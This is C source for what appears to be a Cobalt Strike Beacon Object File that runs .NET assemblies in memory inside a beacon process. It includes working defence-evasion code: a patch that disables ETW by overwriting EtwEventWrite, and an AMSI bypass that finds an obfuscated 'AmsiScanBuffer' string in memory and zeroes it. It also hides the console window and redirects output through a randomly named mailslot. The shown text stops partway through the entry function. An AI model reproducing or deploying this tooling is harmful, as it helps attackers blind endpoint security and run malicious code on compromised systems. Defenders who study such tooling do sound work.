#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>

#include "beacon.h"
#include "inlineExecute-Assembly.h"

#define CHUNK_SIZE 65535  // Optimal chunk size for transmission
#define INITIAL_BUFFER_SIZE 65535  // Initial buffer size for small outputs

// Global cleanup tracking
typedef struct _CLEANUP_CONTEXT {
    char* pipePath;
    char* slotPath;
    wchar_t* wAssemblyArguments;
    wchar_t* wAppDomain;
    HINSTANCE hUser32;
    HANDLE mainHandle;
    HANDLE hFile;
    HANDLE hEvent;
    char* returnData;
    size_t returnDataSize;  // Track allocated size
    BOOL useChunking;  // Flag to indicate if chunking was used
    ICLRMetaHost* pClrMetaHost;
    ICLRRuntimeInfo* pClrRuntimeInfo;
    ICorRuntimeHost* pICorRuntimeHost;
    IUnknown* pAppDomainThunk;
    AppDomain* pAppDomain;
    Assembly* pAssembly;
    MethodInfo* pMethodInfo;
    SAFEARRAY* pSafeArray;
    SAFEARRAY* psaStaticMethodArgs;
    VARIANT vtPsa;
    VARIANT retVal;
    VARIANT obj;
} CLEANUP_CONTEXT, *PCLEANUP_CONTEXT;

// Initialize cleanup context
static void InitCleanupContext(PCLEANUP_CONTEXT ctx) {
    MSVCRT$memset(ctx, 0, sizeof(CLEANUP_CONTEXT));
    ctx->mainHandle = INVALID_HANDLE_VALUE;
    ctx->hFile = INVALID_HANDLE_VALUE;
    ctx->hEvent = INVALID_HANDLE_VALUE;
    ctx->useChunking = FALSE;
    ctx->returnDataSize = 0;
}

// Cleanup function
static void PerformCleanup(PCLEANUP_CONTEXT ctx, BOOL frConsole, BOOL revertETW) {
    // Free allocated memory
    if (ctx->pipePath) { MSVCRT$free(ctx->pipePath); }
    if (ctx->slotPath) { MSVCRT$free(ctx->slotPath); }
    if (ctx->wAssemblyArguments) { MSVCRT$free(ctx->wAssemblyArguments); }
    if (ctx->wAppDomain) { MSVCRT$free(ctx->wAppDomain); }
    if (ctx->returnData) { intFree(ctx->returnData); }

    // Free library handles
    if (ctx->hUser32) { KERNEL32$FreeLibrary(ctx->hUser32); }

    // Close handles
    if (ctx->mainHandle != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->mainHandle); }
    if (ctx->hFile != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->hFile); }
    if (ctx->hEvent != INVALID_HANDLE_VALUE) { KERNEL32$CloseHandle(ctx->hEvent); }

    // Clean up COM objects
    if (ctx->pSafeArray) { OLEAUT32$SafeArrayDestroy(ctx->pSafeArray); }
    if (ctx->psaStaticMethodArgs) { OLEAUT32$SafeArrayDestroy(ctx->psaStaticMethodArgs); }

    OLEAUT32$VariantClear(&ctx->vtPsa);
    OLEAUT32$VariantClear(&ctx->retVal);
    OLEAUT32$VariantClear(&ctx->obj);

    if (ctx->pMethodInfo) { ctx->pMethodInfo->lpVtbl->Release(ctx->pMethodInfo); }
    if (ctx->pAssembly) { ctx->pAssembly->lpVtbl->Release(ctx->pAssembly); }
    if (ctx->pAppDomain) { ctx->pAppDomain->lpVtbl->Release(ctx->pAppDomain); }
    if (ctx->pAppDomainThunk) { ctx->pAppDomainThunk->lpVtbl->Release(ctx->pAppDomainThunk); }

    if (ctx->pICorRuntimeHost && ctx->pAppDomainThunk) {
        ctx->pICorRuntimeHost->lpVtbl->UnloadDomain(ctx->pICorRuntimeHost, ctx->pAppDomainThunk);
    }
    if (ctx->pICorRuntimeHost) { ctx->pICorRuntimeHost->lpVtbl->Release(ctx->pICorRuntimeHost); }
    if (ctx->pClrRuntimeInfo) { ctx->pClrRuntimeInfo->lpVtbl->Release(ctx->pClrRuntimeInfo); }
    if (ctx->pClrMetaHost) { ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost); }

    // Free console if we created one
    if (frConsole) {
        _FreeConsole FreeConsole = (_FreeConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "FreeConsole");
        if (FreeConsole) { FreeConsole(); }
    }

    // Revert ETW if requested
    if (revertETW) {
        BOOL success = patchETW(revertETW);
        if (success != 1) {
            BeaconPrintf(CALLBACK_ERROR , "[!] Reverting ETW back failed");
        }
    }
}

/*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
    *mailHandle = KERNEL32$CreateMailslotA(lpszSlotName,
        0,                             //No maximum message size
        MAILSLOT_WAIT_FOREVER,         //No time-out for operations
        (LPSECURITY_ATTRIBUTES)NULL);  //Default security

    if (*mailHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    else
        return TRUE;
}

/*Read Mailslot with hybrid buffer/chunking approach and intermediate buffering*/
BOOL ReadSlotHybrid(char* output, size_t outputSize, HANDLE* mailHandle, HANDLE* hEventOut) {
    DWORD cbMessage = 0;
    DWORD cMessage = 0;
    DWORD cbRead = 0;
    BOOL fResult;
    LPSTR lpszBuffer = NULL;
    HANDLE hEvent;
    OVERLAPPED ov;
    size_t totalWritten = 0;
    BOOL chunkingMode = FALSE;

    // Intermediate buffer for chunking mode
    char* chunkBuffer = NULL;
    size_t chunkBufferSize = CHUNK_SIZE;
    size_t chunkBufferUsed = 0;

    hEvent = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);
    if (NULL == hEvent) {
        return FALSE;
    }

    *hEventOut = hEvent;

    ov.Offset = 0;
    ov.OffsetHigh = 0;
    ov.hEvent = hEvent;

    while (TRUE) {
        fResult = KERNEL32$GetMailslotInfo(*mailHandle,
            (LPDWORD)NULL,
            &cbMessage,
            &cMessage,
            (LPDWORD)NULL);

        if (!fResult) {
            if (chunkBuffer) MSVCRT$free(chunkBuffer);
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        if (cbMessage == MAILSLOT_NO_MESSAGE) {
            break;
        }

        lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, cbMessage + 1);
        if (NULL == lpszBuffer) {
            if (chunkBuffer) MSVCRT$free(chunkBuffer);
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        fResult = KERNEL32$ReadFile(*mailHandle,
            lpszBuffer,
            cbMessage,
            &cbRead,
            &ov);

        if (!fResult) {
            KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
            if (chunkBuffer) MSVCRT$free(chunkBuffer);
            KERNEL32$CloseHandle(hEvent);
            return FALSE;
        }

        // Ensure null termination
        lpszBuffer[cbRead] = '\0';

        // Get actual string length
        size_t msgLen = MSVCRT$strlen(lpszBuffer);

        // Check if message ends with newline
        BOOL hasNewline = FALSE;
        if (msgLen > 0) {
            if (lpszBuffer[msgLen - 1] == '\n' || lpszBuffer[msgLen - 1] == '\r') {
                hasNewline = TRUE;
            }
        }

        if (!chunkingMode && totalWritten + msgLen + (hasNewline ? 0 : 1) < outputSize - 1) {
            // Normal buffer mode
            MSVCRT$memcpy(output + totalWritten, lpszBuffer, msgLen);
            totalWritten += msgLen;

            // Add newline if message doesn't have one
            if (!hasNewline && msgLen > 0) {
                output[totalWritten] = '\n';
                totalWritten++;
            }

            output[totalWritten] = '\0';
        } else {
            // Switch to or continue in chunking mode
            if (!chunkingMode) {
                // First time switching - send accumulated buffer
                chunkingMode = TRUE;
                output[totalWritten] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s", output);

                // Allocate intermediate chunk buffer
                chunkBuffer = (char*)MSVCRT$malloc(chunkBufferSize);
                if (!chunkBuffer) {
                    KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
                    KERNEL32$CloseHandle(hEvent);
                    return FALSE;
                }
                chunkBufferUsed = 0;
            }

            // Calculate space needed including potential newline
            size_t neededSpace = msgLen + (hasNewline ? 0 : 1);
            size_t spaceLeft = chunkBufferSize - chunkBufferUsed - 1;

            if (neededSpace <= spaceLeft) {
                // Message fits in current chunk buffer
                MSVCRT$memcpy(chunkBuffer + chunkBufferUsed, lpszBuffer, msgLen);
                chunkBufferUsed += msgLen;

                // Add newline if needed
                if (!hasNewline && msgLen > 0) {
                    chunkBuffer[chunkBufferUsed] = '\n';
                    chunkBufferUsed++;
                }

                chunkBuffer[chunkBufferUsed] = '\0';

                // Send chunk if buffer is reasonably full (>75% capacity)
                if (chunkBufferUsed > (chunkBufferSize * 3 / 4)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                    chunkBufferUsed = 0;
                    chunkBuffer[0] = '\0';
                }
            } else {
                // Message doesn't fit - send current buffer and start new one
                if (chunkBufferUsed > 0) {
                    chunkBuffer[chunkBufferUsed] = '\0';
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
                    chunkBufferUsed = 0;
                }

                // Check if this single message is larger than our chunk buffer
                if (neededSpace >= chunkBufferSize - 1) {
                    // Very large single message - send it directly
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", lpszBuffer);
                    if (!hasNewline) {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n");
                    }
                    chunkBufferUsed = 0;
                } else {
                    // Normal message - add to empty buffer
                    MSVCRT$memcpy(chunkBuffer, lpszBuffer, msgLen);
                    chunkBufferUsed = msgLen;

                    if (!hasNewline && msgLen > 0) {
                        chunkBuffer[chunkBufferUsed] = '\n';
                        chunkBufferUsed++;
                    }

                    chunkBuffer[chunkBufferUsed] = '\0';
                }
            }
        }

        KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
    }

    if (chunkingMode) {
        // Send any remaining data in chunk buffer
        if (chunkBufferUsed > 0) {
            chunkBuffer[chunkBufferUsed] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "%s", chunkBuffer);
        }

        MSVCRT$free(chunkBuffer);

        // Final newline for chunked output
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    KERNEL32$CloseHandle(hEvent);
    return !chunkingMode;  // Return FALSE if chunking was used
}

/*Improved version detection for .NET 4.x*/
BOOL FindVersion(void * assembly, int length) {
    char* assembly_c = (char*)assembly;

    // Check for various .NET 4.x versions
    char* v4_versions[] = {
        "v4.0.30319",
        "v4.5",
        "v4.6",
        "v4.7",
        "v4.8"
    };

    int num_versions = sizeof(v4_versions) / sizeof(v4_versions[0]);

    for (int v = 0; v < num_versions; v++) {
        int version_len = MSVCRT$strlen(v4_versions[v]);

        for (int i = 0; i < length - version_len; i++) {
            BOOL found = TRUE;
            for (int j = 0; j < version_len; j++) {
                if (v4_versions[v][j] != assembly_c[i + j]) {
                    found = FALSE;
                    break;
                }
            }
            if (found) {
                return 1;  // .NET 4.x found
            }
        }
    }

    return 0;  // .NET 2.0
}

/*Patch ETW - Fixed*/
BOOL patchETW(BOOL revertETW)
{
    unsigned char etwPatch[8] = {0};  // Sufficient size for both architectures
    SIZE_T uSize = 8;
    ULONG patchSize = 0;

    if (revertETW != 0) {
#ifdef _M_AMD64
        //revert ETW x64
        patchSize = 1;
        etwPatch[0] = 0x4c;
#elif defined(_M_IX86)
        //revert ETW x86
        patchSize = 3;
        etwPatch[0] = 0x8b;
        etwPatch[1] = 0xff;
        etwPatch[2] = 0x55;
#endif
    }
    else {
#ifdef _M_AMD64
        //Break ETW x64
        patchSize = 1;
        etwPatch[0] = 0xc3;
#elif defined(_M_IX86)
        //Break ETW x86
        patchSize = 3;
        etwPatch[0] = 0xc2;
        etwPatch[1] = 0x14;
        etwPatch[2] = 0x00;
#endif
    }

    //Get pointer to EtwEventWrite
    void* pAddress = (PVOID) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if(pAddress == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "[!] Getting pointer to EtwEventWrite failed\n");
        return 0;
    }

    void* lpBaseAddress = pAddress;
    ULONG OldProtection, NewProtection;

    //Change memory protection via NTProtectVirtualMemory
    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory failed %d\n", status);
        return 0;
    }

    //Patch ETW via NTWriteVirtualMemory
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)etwPatch, patchSize, NULL);
    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR , "[!] NtWriteVirtualMemory failed\n");
        return 0;
    }

    //Revert back memory protection via NTProtectVirtualMemory
    status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory2 failed\n");
        return 0;
    }

    //Successfully patched ETW
    return 1;
}

static BOOL IsReadable(DWORD protect, DWORD state)
{
    if (!((protect & PAGE_READONLY) == PAGE_READONLY || (protect & PAGE_READWRITE) == PAGE_READWRITE || (protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE || (protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ)) {
        return 0;
    }

    if ((protect & PAGE_GUARD) == PAGE_GUARD) {
        return 0;
    }

    if ((state & MEM_COMMIT) != MEM_COMMIT) {
        return 0;
    }

    return 1;
}

static BOOL search_mem(MEMORY_BASIC_INFORMATION* region, _NtProtectVirtualMemory NtProtectVirtualMemory)
{
    NTSTATUS status;

    if (!IsReadable(region->Protect, region->State)) {
        return 0;
    }

    for (int j = 0; j < region->RegionSize - 14; j++) {  // Fixed: use actual string length
        unsigned char* current = ((unsigned char*)region->BaseAddress) + j;

        char target_name[] = "AnsiScamBaffer";
        target_name[1] = 'm'; target_name[7] = 'n'; target_name[9] = 'u';
        int target_len = 14;

        BOOL found = 1;
        for (int k = 0; k < target_len; k++) {  // Fixed: use target_len instead of sizeof
            if (current[k] != target_name[k]) {
                found = 0;
                break;
            }
        }

        if (found) {
            DWORD original = 0;
            if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
                status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&region->BaseAddress, (PULONG)&region->RegionSize, PAGE_READWRITE, &original);
                if (status != STATUS_SUCCESS) {
                    BeaconPrintf(CALLBACK_ERROR , "[!] search_mem: NtProtectVirtualMemory failed\n");
                    continue;
                }
            }

            for (int m = 0; m < target_len; m++) {
                current[m] = 0;
            }

            if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
                NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&region->BaseAddress, (PULONG)&region->RegionSize, region->Protect, &original);
            }

            return 1;
        }
    }

    return 0;
}

BOOL patchAMSI()
{
    _NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

    HANDLE hProcess = KERNEL32$GetCurrentProcess();

    SYSTEM_INFO sysInfo;
    KERNEL32$GetSystemInfo(&sysInfo);

    int count = 0;
    unsigned char* pAddress = 0;
    MEMORY_BASIC_INFORMATION memInfo;

    while (pAddress < sysInfo.lpMaximumApplicationAddress) {
        if (KERNEL32$VirtualQuery(pAddress, &memInfo, sizeof(memInfo))) {
            if (search_mem(&memInfo, pNtProtectVirtualMemory))
                count++;
        }
        pAddress += memInfo.RegionSize;
    }

    return (count > 0);
}

/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRRuntimeInfo * *ppClrRuntimeInfo, ICorRuntimeHost * *ppICorRuntimeHost) {

    HRESULT hr = (HRESULT)NULL;

    hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

    if (hr == S_OK)
    {
        hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
        if (hr == S_OK)
        {
            BOOL fLoadable;
            hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
            if ((hr == S_OK) && fLoadable)
            {
                hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
                if (hr == S_OK)
                {
                    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
                }
                else
                {
                    BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to get interface of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to get runtime of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to create %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
        return 0;
    }

    return 1;
}

/*Check Console Exists*/
static BOOL consoleExists(void) {
    _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
    return !!GetConsoleWindow();
}

#define TMPBUFLEN 64

typedef BOOLEAN(WINAPI *RTLGENRANDOM)(PVOID, ULONG);

void gen_rand_str(char *buffer, int offset, int length)
{
    unsigned char randomBytes[TMPBUFLEN];

    RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("advapi32.dll"), "SystemFunction036");
    if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, TMPBUFLEN))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] gen_rand_str: RtlGenRandom failed");
        return;
    }

    int end = offset + length;
    if (end > TMPBUFLEN) end = TMPBUFLEN;

    for (int i = offset; i < end; i++)
    {
        unsigned char val = randomBytes[i] % 26;
        buffer[i] = 'A' + val;
    }
    buffer[end] = '\0';
}

/*BOF Entry Point*/
void go(IN PCHAR buffer, IN ULONG blength)
{
    CLEANUP_CONTEXT ctx;
    InitCleanupContext(&ctx);

    datap parser;
    BeaconDataParse(&parser, buffer, blength);

    size_t assemblyByteLen = 0;
    char* assemblyBytes = BeaconDataExtract(&parser, &assemblyByteLen);

    // Extract arguments with length checking
    size_t argumentsLen = 0;
    char* assemblyArguments = BeaconDataExtract(&parser, &argumentsLen);

    // Validate arguments - if NULL, zero length, or contains only whitespace, treat as no arguments
    BOOL hasArguments = FALSE;
    if (assemblyArguments != NULL && argumentsLen > 0) {
        // Check if arguments contain any non-whitespace characters
        for (size_t i = 0; i < argumentsLen; i++) {
            if (assemblyArguments[i] != '\0' && assemblyArguments[i] != ' ' &&
                assemblyArguments[i] != '\t' && assemblyArguments[i] != '\n' &&
                assemblyArguments[i] != '\r') {
                hasArguments = TRUE;
                break;
            }
        }
    }

    // defaults
    char appDomain[TMPBUFLEN] = { 't', 'e', 's', 't', '-' };           gen_rand_str(appDomain, 5, 8);
    char pipeName[TMPBUFLEN]  = { 's', 'v', 'c', 't', 's', 't', '.' }; gen_rand_str(pipeName, 7, 12);
    char slotName[TMPBUFLEN]  = { 't', 's', 't', 's', 'l', 't', '-' }; gen_rand_str(slotName, 7, 8);

    BOOL amsi = 1;
    BOOL etw = 1;
    BOOL revertETW = 1;
    BOOL mailSlot = 1;  // Always use mailslot to avoid deadlock issues
    ULONG entryPoint = 1;

    //Create slot and pipe names with proper memory management
    SIZE_T pipeNameLen = MSVCRT$strlen(pipeName);
    ctx.pipePath = MSVCRT$malloc(pipeNameLen + 10);
    if (!ctx.pipePath) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        return;
    }
    MSVCRT$memset(ctx.pipePath, 0, pipeNameLen + 10);
    MSVCRT$memcpy(ctx.pipePath, "\\\\.\\pipe\\", 9 );
    MSVCRT$memcpy(ctx.pipePath+9, pipeName, pipeNameLen+1 );

    SIZE_T slotNameLen = MSVCRT$strlen(slotName);
    ctx.slotPath = MSVCRT$malloc(slotNameLen + 14);
    if (!ctx.slotPath) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        PerformCleanup(&ctx, FALSE, FALSE);
        return;
    }
    MSVCRT$memset(ctx.slotPath, 0, slotNameLen + 14);
    MSVCRT$memcpy(ctx.slotPath, "\\\\.\\mailslot\\", 13 );
    MSVCRT$memcpy(ctx.slotPath+13, slotName, slotNameLen+1 );

    //Declare other variables
    HRESULT hr = (HRESULT)NULL;
    LPWSTR* argumentsArray = NULL;
    int argumentCount = 0;
    HANDLE stdOutput;
    HANDLE stdError;
    size_t wideSize = 0;
    size_t wideSize2 = 0;
    BOOL success = 1;
    BOOL frConsole = 0;

    // Allocate initial buffer with configurable size
    ctx.returnDataSize = INITIAL_BUFFER_SIZE;
    ctx.returnData = (char*)intAlloc(ctx.returnDataSize);
    if (!ctx.returnData) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        PerformCleanup(&ctx, FALSE, FALSE);
        return;
    }
    memset(ctx.returnData, 0, ctx.returnDataSize);

    //Determine .NET assembly version
    wchar_t* wNetVersion = NULL;
    if(FindVersion((void*)assemblyBytes, assemblyByteLen))
    {
        wNetVersion = L"v4.0.30319";
    }
    else
    {
        wNetVersion = L"v2.0.50727";
    }

    //Handle argument conversion based on whether we have valid arguments
    if (hasArguments) {
        // Convert assemblyArguments to wide string
        size_t convertedChars = 0;
        wideSize = MSVCRT$strlen(assemblyArguments) + 1;
        ctx.wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
        if (!ctx.wAssemblyArguments) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
            PerformCleanup(&ctx, FALSE, FALSE);
            return;
        }
        MSVCRT$mbstowcs_s(&convertedChars, ctx.wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);

        // Parse arguments
        argumentsArray = SHELL32$CommandLineToArgvW(ctx.wAssemblyArguments, &argumentCount);
    } else {
        // No arguments - create empty wide string
        ctx.wAssemblyArguments = (wchar_t*)MSVCRT$malloc(sizeof(wchar_t));
        if (!ctx.wAssemblyArguments) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
            PerformCleanup(&ctx, FALSE, FALSE);
            return;
        }
        ctx.wAssemblyArguments[0] = L'\0';
        argumentsArray = NULL;
        argumentCount = 0;
    }

    //Convert appDomain to wide string
    size_t convertedChars2 = 0;
    wideSize2 = MSVCRT$strlen(appDomain) + 1;
    ctx.wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
    if (!ctx.wAppDomain) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed");
        PerformCleanup(&ctx, FALSE, FALSE);
        return;
    }
    MSVCRT$mbstowcs_s(&convertedChars2, ctx.wAppDomain, wideSize2, appDomain, _TRUNCATE);

    //Create an array of strings for arguments
    ctx.vtPsa.vt = (VT_ARRAY | VT_BSTR);
    ctx.vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

    // Only populate array if we have arguments
    if (argumentCount > 0 && argumentsArray != NULL) {
        for (long i = 0; i < argumentCount; i++)
        {
            if (argumentsArray[i] != NULL) {
                OLEAUT32$SafeArrayPutElement(ctx.vtPsa.parray, &i, OLEAUT32$SysAllocString(argumentsArray[i]));
            }
        }
    }

    //Break ETW
    if (etw != 0 || revertETW != 0) {
        success = patchETW(0);

        if (success != 1) {
            BeaconPrintf(CALLBACK_ERROR , "[!] Patching ETW failed. Try running without patching ETW");
            PerformCleanup(&ctx, FALSE, FALSE);
            return;
        }
    }

    //Start CLR
    success = StartCLR((LPCWSTR)wNetVersion, &ctx.pClrMetaHost, &ctx.pClrRuntimeInfo, &ctx.pICorRuntimeHost);

    if (success != 1) {
        PerformCleanup(&ctx, FALSE, revertETW);
        return;
    }

    // Create unique mutex for synchronization
    char mutexName[TMPBUFLEN] = { 'm', 'x', '-' };
    gen_rand_str(mutexName, 3, 12);
    HANDLE hMutex = KERNEL32$CreateMutexA(NULL, TRUE, mutexName);

    success = MakeSlot(ctx.slotPath, &ctx.mainHandle);
    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create mailslot");
        KERNEL32$ReleaseMutex(hMutex);
        KERNEL32$CloseHandle(hMutex);
        PerformCleanup(&ctx, FALSE, revertETW);
        return;
    }

    ctx.hFile = KERNEL32$CreateFileA(ctx.slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

    KERNEL32$ReleaseMutex(hMutex);
    KERNEL32$CloseHandle(hMutex);

    if (ctx.hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open mailslot for writing");
        PerformCleanup(&ctx, FALSE, revertETW);
        return;
    }

    //Attach or create console
    BOOL attConsole = consoleExists();

    if (attConsole != 1)
    {
        frConsole = 1;
        _AllocConsole AllocConsole = (_AllocConsole) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "AllocConsole");
        _GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
        AllocConsole();

        //Hide Console Window
        ctx.hUser32 = KERNEL32$LoadLibraryA("user32.dll");
        if (ctx.hUser32) {
            _ShowWindow ShowWindow = (_ShowWindow)KERNEL32$GetProcAddress(ctx.hUser32, "ShowWindow");
            HWND wnd = GetConsoleWindow();
            if (wnd)
                ShowWindow(wnd, SW_HIDE);
        }
    }

    //Get current stdout handle
    _GetStdHandle GetStdHandle = (_GetStdHandle) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "GetStdHandle");
    stdOutput = GetStdHandle(((DWORD)-11));

    //Set stdout to our named pipe or mail slot
    _SetStdHandle SetStdHandle = (_SetStdHandle) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "SetStdHandle");
    success = SetStdHandle(((DWORD)-11), ctx.hFile);

    //Create our AppDomain
    hr = ctx.pICorRuntimeHost->lpVtbl->CreateDomain(ctx.pICorRuntimeHost, (LPCWSTR)ctx.wAppDomain, NULL, &ctx.pAppDomainThunk);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create AppDomain");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

    hr = ctx.pAppDomainThunk->lpVtbl->QueryInterface(ctx.pAppDomainThunk, &xIID_AppDomain, (VOID**)&ctx.pAppDomain);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to query AppDomain interface");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

    //Patch amsi
    if (amsi != 0) {
        success = patchAMSI();

        if (success != 1) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Patching AMSI failed. Try running without patching AMSI and using obfuscation");
            SetStdHandle(((DWORD)-11), stdOutput);
            PerformCleanup(&ctx, frConsole, revertETW);
            return;
        }
    }

    //Prep SafeArray
    SAFEARRAYBOUND rgsabound[1] = { 0 };
    rgsabound[0].cElements = assemblyByteLen;
    rgsabound[0].lLbound = 0;
    ctx.pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, rgsabound);
    if (!ctx.pSafeArray) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create SafeArray");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

    void* pvData = NULL;
    hr = OLEAUT32$SafeArrayAccessData(ctx.pSafeArray, &pvData);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to access SafeArray data");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

    MSVCRT$memcpy(pvData, assemblyBytes, assemblyByteLen);
    hr = OLEAUT32$SafeArrayUnaccessData(ctx.pSafeArray);

    //Load assembly
    hr = ctx.pAppDomain->lpVtbl->Load_3(ctx.pAppDomain, ctx.pSafeArray, &ctx.pAssembly);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load AppDomain of %ls CLR version. Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

    hr = ctx.pAssembly->lpVtbl->EntryPoint(ctx.pAssembly, &ctx.pMethodInfo);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to find entry point of assembly.\n");
        SetStdHandle(((DWORD)-11), stdOutput);
        PerformCleanup(&ctx, frConsole, revertETW);
        return;
    }

